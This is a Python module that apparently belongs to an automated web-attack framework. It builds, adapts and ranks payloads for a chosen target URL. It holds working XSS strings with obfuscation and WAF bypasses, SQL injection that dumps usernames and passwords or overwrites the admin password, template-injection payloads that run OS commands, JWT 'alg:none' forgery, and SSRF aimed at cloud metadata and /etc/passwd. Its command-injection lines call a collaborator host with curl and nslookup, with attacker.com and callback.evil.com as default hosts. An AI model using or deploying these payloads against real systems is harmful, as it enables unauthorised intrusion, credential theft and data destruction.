"""
Unified Payload Manager
========================
Combines payload generation, adaptation, scoring, and selection into a single module.
Merges functionality from enhanced_payload_manager.py, payload_manager.py, and advanced_payload_plugin.py
"""

import re
import base64
import json
import random
import string
import urllib.parse
import numpy as np
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from datetime import datetime
from urllib.parse import urlparse, urljoin
from packaging import version
from packaging.specifiers import SpecifierSet

# Import only what we need from vulnerability_kb and fingerprinter
from .vulnerability_kb import (
    VulnerabilityKnowledgeBase,
    VulnPayload,
    VulnCategory
)
from .fingerprinter import TargetFingerprint

# ============================================================================
# DATA CLASSES
# ============================================================================

@dataclass
class PayloadContext:
    """Context information for payload adaptation"""
    target_url: str
    parameter_name: Optional[str] = None
    injection_context: str = "parameter"  # parameter, header, path, body
    quote_context: str = "none"  # single, double, none
    database_type: Optional[str] = None
    encoding_required: List[str] = None
    waf_detected: Optional[str] = None
    
    # Attacker infrastructure
    attacker_domain: Optional[str] = None
    collaborator_url: Optional[str] = None
    callback_host: Optional[str] = None
    
    # Target specifics
    object_id: Optional[str] = None
    user_id: Optional[str] = None
    session_token: Optional[str] = None

@dataclass
class PayloadScore:
    """Scoring components for payload ranking"""
    version_match: float = 0.0
    pattern_match: float = 0.0
    confidence_base: float = 0.0
    tag_match: float = 0.0
    context_match: float = 0.0
    historical_success: float = 0.0
    total: float = 0.0
    
    def calculate_total(self, weights: Dict[str, float]) -> float:
        """Calculate weighted total score"""
        self.total = (
            self.version_match * weights.get('version', 0.3) +
            self.pattern_match * weights.get('pattern', 0.2) +
            self.confidence_base * weights.get('confidence', 0.2) +
            self.tag_match * weights.get('tag', 0.1) +
            self.context_match * weights.get('context', 0.1) +
            self.historical_success * weights.get('history', 0.1)
        )
        return self.total

@dataclass
class RankedPayload:
    """Payload with ranking information"""
    payload: str  # The actual payload string
    metadata: Optional[VulnPayload] = None  # KB metadata if available
    score: PayloadScore = field(default_factory=PayloadScore)
    rank: int = 0
    reasoning: List[str] = field(default_factory=list)
    category: str = ""
    name: str = ""

# ============================================================================
# PAYLOAD GENERATOR (from advanced_payload_plugin.py)
# ============================================================================

class PayloadGenerator:
    """Generates fresh payloads for different vulnerability types"""
    
    def generate(self, vuln_type: str, target_info: Dict = None) -> List[Dict]:
        """Generate payloads based on vulnerability type"""
        vuln_type_lower = vuln_type.lower()
        target_info = target_info or {}
        
        if 'xss' in vuln_type_lower:
            payloads = self._generate_xss_payloads(target_info)
        elif 'sqli' in vuln_type_lower or 'sql' in vuln_type_lower:
            payloads = self._generate_sqli_payloads(target_info)
        elif 'ssti' in vuln_type_lower:
            payloads = self._generate_ssti_payloads(target_info)
        elif 'jwt' in vuln_type_lower:
            payloads = self._generate_jwt_payloads(target_info)
        elif 'ssrf' in vuln_type_lower:
            payloads = self._generate_ssrf_payloads(target_info)
        elif 'rce' in vuln_type_lower or 'command' in vuln_type_lower:
            payloads = self._generate_rce_payloads(target_info)
        elif 'idor' in vuln_type_lower:
            payloads = self._generate_idor_payloads(target_info)
        else:
            payloads = []
        
        # Convert to dict format
        return [
            {
                'payload': p,
                'category': vuln_type,
                'name': f'generated_{vuln_type}_{i}',
                'confidence': 0.6  # Generated payloads have moderate confidence
            }
            for i, p in enumerate(payloads)
        ]
    
    def _generate_xss_payloads(self, target_info: Dict) -> List[str]:
        """Generate advanced XSS payloads"""
        base_payloads = [
            # HTML entity encoding
            "&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;",
            # Unicode encoding
            "\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0027\\u0058\\u0053\\u0053\\u0027\\u0029",
            # Event handlers
            'onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))',
            # Template literals
            "onerror=eval`String.fromCharCode(97,108,101,114,116,96,88,83,83,96)`",
            # DOM breaking
            '"><svg/onload=alert(`XSS`)>',
            # WAF bypass
            "<ScRiPt>alert(String.fromCharCode(88,83,83))</ScRiPt>",
            # Polyglot
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
        ]
        
        # Context-aware encoding
        context = target_info.get('context', 'html')
        encoded_payloads = []
        
        for payload in base_payloads:
            if context == 'url':
                encoded_payloads.append(urllib.parse.quote(payload))
            elif context == 'double_quoted':
                encoded_payloads.append(payload.replace('"', '\\"'))
            else:
                encoded_payloads.append(payload)
        
        return base_payloads + encoded_payloads
    
    def _generate_sqli_payloads(self, target_info: Dict) -> List[str]:
        """Generate SQL injection payloads"""
        return [
            # Boolean-based blind
            "' OR '1'='1",
            "' OR (SELECT '1' FROM users WHERE username='admin' AND LENGTH(password)>10)='1",
            # Time-based blind
            "'; IF (1=1) WAITFOR DELAY '00:00:05'--",
            "' AND SLEEP(5)--",
            # Union-based
            "' UNION SELECT NULL,username,password FROM users--",
            # Error-based
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            # Second-order
            "admin'; UPDATE users SET password='hacked' WHERE username='admin'--",
            # NoSQL
            "' || '1'=='1",
            # PostgreSQL
            "'; SELECT pg_sleep(5)--",
            # MSSQL
            "'; EXEC xp_cmdshell('ping 127.0.0.1')--"
        ]
    
    def _generate_ssti_payloads(self, target_info: Dict) -> List[str]:
        """Generate SSTI payloads"""
        return [
            # Jinja2
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
            # Django
            "{% load os %}{{ os.system('id') }}",
            # Smarty
            "{php}echo `id`;{/php}",
            # Freemarker
            "${'freemarker.template.utility.Execute'?new()('id')}",
            # Detection
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>"
        ]
    
    def _generate_jwt_payloads(self, target_info: Dict) -> List[str]:
        """Generate JWT payloads"""
        return [
            '{"alg":"none","typ":"JWT"}',
            '{"alg":"HS256","typ":"JWT"}',
            '{"alg":"RS256","jwk":{"kty":"RSA","e":"AQAB","n":"1"}}',
            '{"admin":true,"user":"admin"}',
            '{"exp":9999999999,"user":"admin"}'
        ]
    
    def _generate_ssrf_payloads(self, target_info: Dict) -> List[str]:
        """Generate SSRF payloads"""
        return [
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:6379/_SET%20key%20value",
            "dict://127.0.0.1:11211/stats",
            "http://localhost:8080/admin",
            "http://COLLABORATOR_URL"
        ]
    
    def _generate_rce_payloads(self, target_info: Dict) -> List[str]:
        """Generate RCE payloads"""
        return [
            "; nslookup COLLABORATOR_URL",
            "& ping -c 1 COLLABORATOR_URL",
            "| curl COLLABORATOR_URL",
            "`nslookup COLLABORATOR_URL`",
            "$(nslookup COLLABORATOR_URL)",
            "'; exec('nslookup COLLABORATOR_URL');",
        ]
    
    def _generate_idor_payloads(self, target_info: Dict) -> List[str]:
        """Generate IDOR payloads"""
        return [
            "../users/admin",
            "../../admin/panel",
            "0",
            "99999",
            "-1",
            "admin",
            "1' OR '1'='1"
        ]

# ============================================================================
# PAYLOAD ADAPTER (from enhanced_payload_manager.py)
# ============================================================================

class PayloadAdapter:
    """Adapts generic payloads to specific target contexts"""
    
    def __init__(self):
        self.global_replacements = {
            'ATTACKER_DOMAIN': 'attacker_domain',
            'COLLABORATOR_URL': 'collaborator_url',
            'CALLBACK_HOST': 'callback_host',
            'TARGET_HOST': 'target_host',
            'TARGET_ORIGIN': 'target_origin',
            'TARGET_PATH': 'target_path',
            'PARAM': 'parameter_name',
            'ID': 'object_id',
            'OBJECT_ID': 'object_id',
            'USER_ID': 'user_id',
            'CMD': 'command'
        }
        
        self.db_adaptations = {
            'mysql': {
                'sleep_function': 'SLEEP(5)',
                'version_function': '@@version',
                'comment_syntax': '-- ',
                'concat_function': 'CONCAT'
            },
            'postgresql': {
                'sleep_function': 'pg_sleep(5)',
                'version_function': 'version()',
                'comment_syntax': '-- ',
                'concat_function': '||'
            },
            'mssql': {
                'sleep_function': "WAITFOR DELAY '0:0:5'",
                'version_function': '@@version',
                'comment_syntax': '-- ',
                'concat_function': '+'
            }
        }
    
    def adapt_payload(self, payload: str, context: PayloadContext, 
                     fingerprint: Optional[TargetFingerprint] = None) -> str:
        """Adapt a generic payload to specific target context"""
        adapted = payload
        
        # Extract target information
        parsed_url = urlparse(context.target_url)
        target_host = parsed_url.netloc
        target_origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
        target_path = parsed_url.path or "/"
        
        # Build replacements
        replacements = {
            'attacker_domain': context.attacker_domain or 'attacker.com',
            'collaborator_url': context.collaborator_url or 'https://collab.oast.site',
            'callback_host': context.callback_host or 'callback.evil.com',
            'target_host': target_host,
            'target_origin': target_origin,
            'target_path': target_path,
            'parameter_name': context.parameter_name or 'id',
            'object_id': context.object_id or '1',
            'user_id': context.user_id or '1',
            'command': 'nslookup ' + (context.collaborator_url or 'test.oast.site')
        }
        
        # Perform replacements
        for placeholder, context_key in self.global_replacements.items():
            if placeholder in adapted and context_key in replacements:
                adapted = adapted.replace(placeholder, str(replacements[context_key]))
        
        # Handle vulnerability-specific adaptations
        adapted = self._adapt_by_vulnerability_type(adapted, context, fingerprint)
        
        # Apply encoding if required
        if context.encoding_required:
            adapted = self._apply_encoding(adapted, context.encoding_required)
        
        # Handle WAF evasion if detected
        if context.waf_detected:
            adapted = self._apply_waf_evasion(adapted, context.waf_detected)
        
        return adapted
    
    def _adapt_by_vulnerability_type(self, payload: str, context: PayloadContext,
                                   fingerprint: Optional[TargetFingerprint]) -> str:
        """Apply vulnerability-specific adaptations"""
        vuln_type = self._detect_vuln_type(payload)
        
        if vuln_type == 'SQLI':
            return self._adapt_sqli_payload(payload, context, fingerprint)
        elif vuln_type == 'XSS':
            return self._adapt_xss_payload(payload, context, fingerprint)
        
        return payload
    
    def _detect_vuln_type(self, payload: str) -> str:
        """Detect vulnerability type from payload"""
        payload_lower = payload.lower()
        
        if any(x in payload_lower for x in ['union', 'select', 'sleep(', 'waitfor']):
            return 'SQLI'
        elif any(x in payload_lower for x in ['<script', 'onerror', 'onload', 'alert(']):
            return 'XSS'
        elif any(x in payload_lower for x in ['http://', 'gopher://', 'file://']):
            return 'SSRF'
        elif any(x in payload_lower for x in ['&&', ';', '`', '$(']):
            return 'RCE'
        
        return 'UNKNOWN'
    
    def _adapt_sqli_payload(self, payload: str, context: PayloadContext,
                           fingerprint: Optional[TargetFingerprint]) -> str:
        """Adapt SQL injection payloads"""
        adapted = payload
        
        # Determine database type
        db_type = context.database_type or 'mysql'
        
        if db_type in self.db_adaptations:
            db_config = self.db_adaptations[db_type]
            adapted = re.sub(r'SLEEP\(\d+\)', db_config['sleep_function'], adapted)
            adapted = re.sub(r'@@version', db_config['version_function'], adapted)
        
        # Handle quote context
        if context.quote_context == 'single':
            adapted = adapted.replace("'", "\\'")
        elif context.quote_context == 'double':
            adapted = adapted.replace('"', '\\"').replace("'", '"')
        
        return adapted
    
    def _adapt_xss_payload(self, payload: str, context: PayloadContext,
                          fingerprint: Optional[TargetFingerprint]) -> str:
        """Adapt XSS payloads"""
        adapted = payload
        
        if context.attacker_domain:
            adapted = re.sub(r'https?://[^/\s"\']+', context.attacker_domain, adapted)
        
        if context.injection_context == 'attribute':
            if context.quote_context == 'single':
                adapted = f"' {adapted} '"
            elif context.quote_context == 'double':
                adapted = f'" {adapted} "'
        
        return adapted
    
    def _apply_encoding(self, payload: str, encodings: List[str]) -> str:
        """Apply encoding layers"""
        encoded = payload
        
        for encoding in encodings:
            if encoding == 'url':
                encoded = urllib.parse.quote(encoded)
            elif encoding == 'base64':
                encoded = base64.b64encode(encoded.encode()).decode()
            elif encoding == 'html':
                encoded = ''.join(f'&#{ord(c)};' for c in encoded)
        
        return encoded
    
    def _apply_waf_evasion(self, payload: str, waf_type: str) -> str:
        """Apply WAF-specific evasion"""
        if waf_type.lower() == 'cloudflare':
            payload = self._random_case(payload)
        return payload
    
    def _random_case(self, text: str) -> str:
        """Randomize case for evasion"""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in text)

# ============================================================================
# PAYLOAD SCORER (from payload_manager.py)
# ============================================================================

class PayloadScorer:
    """Scores and ranks payloads"""
    
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or self._default_config()
        self.history = {}
    
    def _default_config(self) -> Dict:
        return {
            'weights': {
                'version': 0.35,
                'pattern': 0.25,
                'confidence': 0.20,
                'tag': 0.10,
                'context': 0.05,
                'history': 0.05
            },
            'min_score': 0.3
        }
    
    def score_payload(self, payload: Dict, fingerprint: TargetFingerprint,
                     context: Optional[Dict]) -> PayloadScore:
        """Score a single payload"""
        score = PayloadScore()
        
        # Version match
        if 'product' in payload:
            score.version_match = self._score_version_match(payload, fingerprint)
        else:
            score.version_match = 0.5
        
        # Confidence base
        score.confidence_base = payload.get('confidence', 0.5)
        
        # Context match
        score.context_match = self._score_context_match(payload, context)
        
        # Historical success
        payload_id = payload.get('name', str(hash(payload['payload'])))
        score.historical_success = self._get_historical_success(payload_id)
        
        # Calculate total
        score.calculate_total(self.config['weights'])
        
        return score
    
    def _score_version_match(self, payload: Dict, fingerprint: TargetFingerprint) -> float:
        """Score version compatibility"""
        payload_product = payload.get('product', '').lower()
        
        if not payload_product:
            return 0.5
        
        if fingerprint.product and payload_product == fingerprint.product.lower():
            return 1.0
        
        if any(payload_product in tech.lower() for tech in fingerprint.technologies):
            return 0.7
        
        return 0.2
    
    def _score_context_match(self, payload: Dict, context: Optional[Dict]) -> float:
        """Score context appropriateness"""
        if not context:
            return 0.5
        
        inj_context = context.get('injection_context', '')
        payload_context = payload.get('context', '')
        
        if inj_context and payload_context:
            if inj_context == payload_context:
                return 1.0
            else:
                return 0.3
        
        return 0.5
    
    def _get_historical_success(self, payload_id: str) -> float:
        """Get historical success rate"""
        if payload_id in self.history:
            stats = self.history[payload_id]
            if stats['attempts'] > 0:
                return stats['successes'] / stats['attempts']
        return 0.5
    
    def update_history(self, payload_id: str, success: bool):
        """Update success history"""
        if payload_id not in self.history:
            self.history[payload_id] = {'attempts': 0, 'successes': 0}
        
        self.history[payload_id]['attempts'] += 1
        if success:
            self.history[payload_id]['successes'] += 1

# ============================================================================
# UNIFIED PAYLOAD MANAGER
# ============================================================================

class UnifiedPayloadManager:
    """
    Main payload manager that combines generation, adaptation, scoring, and selection
    This is the primary interface that should be used by orchestrator.py
    """
    
    def __init__(self, kb_path: Optional[str] = None, config: Optional[Dict] = None):
        self.kb = VulnerabilityKnowledgeBase(kb_path) if kb_path else None
        self.generator = PayloadGenerator()
        self.adapter = PayloadAdapter()
        self.scorer = PayloadScorer(config)
        self.config = config or {}
        self.cache = {}
        self.fingerprint_cache = {}
    
    def get_payloads_for_target(self,
                                target_url: str,
                                vulnerability_type: str,
                                fingerprint: Optional[TargetFingerprint] = None,
                                context: Optional[PayloadContext] = None,
                                top_n: int = 10,
                                include_generated: bool = True) -> List[RankedPayload]:
        """
        Get top payloads for a target, combining KB and generated payloads
        
        Args:
            target_url: Target URL
            vulnerability_type: Type of vulnerability (XSS, SQLI, etc.)
            fingerprint: Target fingerprint
            context: Payload context for adaptation
            top_n: Number of payloads to return
            include_generated: Whether to include generated payloads
            
        Returns:
            List of ranked payloads ready for use
        """
        all_payloads = []
        
        # Get KB payloads if available
        if self.kb:
            try:
                vuln_category = VulnCategory[vulnerability_type.upper()]
                kb_payloads = self.kb.get_payloads_by_category(vuln_category)
                
                # Convert to dict format
                for kbp in kb_payloads:
                    all_payloads.append({
                        'payload': kbp.payload,
                        'category': vulnerability_type,
                        'name': kbp.name,
                        'confidence': kbp.confidence_score,
                        'product': kbp.product,
                        'metadata': kbp
                    })
            except (KeyError, AttributeError):
                pass
        
        # Generate fresh payloads if requested
        if include_generated:
            target_info = {'url': target_url}
            if fingerprint:
                target_info.update({
                    'product': fingerprint.product,
                    'version': fingerprint.version,
                    'technologies': fingerprint.technologies
                })
            
            generated = self.generator.generate(vulnerability_type, target_info)
            all_payloads.extend(generated)
        
        # Create default context if not provided
        if not context:
            context = PayloadContext(target_url=target_url)
        
        # Adapt, score, and rank all payloads
        ranked_payloads = []
        
        for payload_dict in all_payloads:
            # Adapt payload to context
            adapted = self.adapter.adapt_payload(
                payload_dict['payload'],
                context,
                fingerprint
            )
            
            # Score payload
            score = self.scorer.score_payload(payload_dict, fingerprint or self._default_fingerprint(), {})
            
            # Generate reasoning
            reasoning = self._generate_reasoning(payload_dict, score, fingerprint)
            
            # Create ranked payload
            ranked = RankedPayload(
                payload=adapted,
                metadata=payload_dict.get('metadata'),
                score=score,
                rank=0,
                reasoning=reasoning,
                category=payload_dict.get('category', vulnerability_type),
                name=payload_dict.get('name', 'unnamed')
            )
            
            ranked_payloads.append(ranked)
        
        # Sort by score and assign ranks
        ranked_payloads.sort(key=lambda x: x.score.total, reverse=True)
        
        for i, rp in enumerate(ranked_payloads[:top_n]):
            rp.rank = i + 1
        
        return ranked_payloads[:top_n]
    
    def adapt_payload_to_context(self, payload: str, target_url: str,
                                 context: Optional[PayloadContext] = None,
                                 fingerprint: Optional[TargetFingerprint] = None) -> str:
        """Adapt a single payload to context (convenience method)"""
        if not context:
            context = PayloadContext(target_url=target_url)
        
        return self.adapter.adapt_payload(payload, context, fingerprint)
    
    def update_payload_success(self, payload_name: str, success: bool):
        """Update success history for a payload"""
        self.scorer.update_history(payload_name, success)
    
    def _generate_reasoning(self, payload_dict: Dict, score: PayloadScore,
                           fingerprint: Optional[TargetFingerprint]) -> List[str]:
        """Generate reasoning for payload selection"""
        reasons = []
        
        if score.version_match >= 0.8:
            if 'product' in payload_dict:
                reasons.append(f"Matches target product: {payload_dict['product']}")
        
        if score.confidence_base >= 0.8:
            reasons.append(f"High confidence ({score.confidence_base:.0%})")
        
        if score.historical_success >= 0.7:
            reasons.append(f"Historical success rate: {score.historical_success:.0%}")
        
        if payload_dict.get('name', '').startswith('generated_'):
            reasons.append("Dynamically generated for target")
        
        if not reasons:
            reasons.append("General purpose payload")
        
        return reasons
    
    def _default_fingerprint(self) -> TargetFingerprint:
        """Create a default fingerprint when none provided"""
        return TargetFingerprint(
            url='',
            product='unknown',
            version='unknown',
            technologies=[],
            frameworks=[],
            headers={}
        )
    
    def export_report(self, ranked_payloads: List[RankedPayload]) -> Dict:
        """Export detailed payload selection report"""
        return {
            'timestamp': datetime.now().isoformat(),
            'total_payloads': len(ranked_payloads),
            'payloads': [
                {
                    'rank': rp.rank,
                    'name': rp.name,
                    'category': rp.category,
                    'payload': rp.payload[:100] + '...' if len(rp.payload) > 100 else rp.payload,
                    'score': {
                        'total': rp.score.total,
                        'confidence': rp.score.confidence_base,
                        'version_match': rp.score.version_match
                    },
                    'reasoning': rp.reasoning
                }
                for rp in ranked_payloads
            ]
        }

# ============================================================================
# BACKWARD COMPATIBILITY CLASSES
# ============================================================================

# Keep these for backward compatibility with existing code
class PayloadManager(UnifiedPayloadManager):
    """Alias for backward compatibility"""
    pass

class EnhancedPayloadManager(UnifiedPayloadManager):
    """Alias for backward compatibility"""
    pass

class SmartPayloadSelector:
    """Simplified interface for backward compatibility"""
    
    def __init__(self, kb_path: Optional[str] = None):
        self.manager = UnifiedPayloadManager(kb_path)
    
    def select_for_target(self, target: str, vulnerability: str,
                         aggressive: bool = False, context: Optional[Dict] = None) -> List[Dict]:
        """Select payloads (backward compatible interface)"""
        ranked = self.manager.get_payloads_for_target(
            target_url=target,
            vulnerability_type=vulnerability,
            context=None,  # Convert dict context to PayloadContext if needed
            top_n=10
        )
        
        return [
            {
                'payload': rp.payload,
                'name': rp.name,
                'rank': rp.rank,
                'score': rp.score.total,
                'reasoning': rp.reasoning,
                'confidence': rp.score.confidence_base
            }
            for rp in ranked
        ]
    
    def update_results(self, payload_name: str, success: bool):
        """Update results (backward compatible)"""
        self.manager.update_payload_success(payload_name, success)
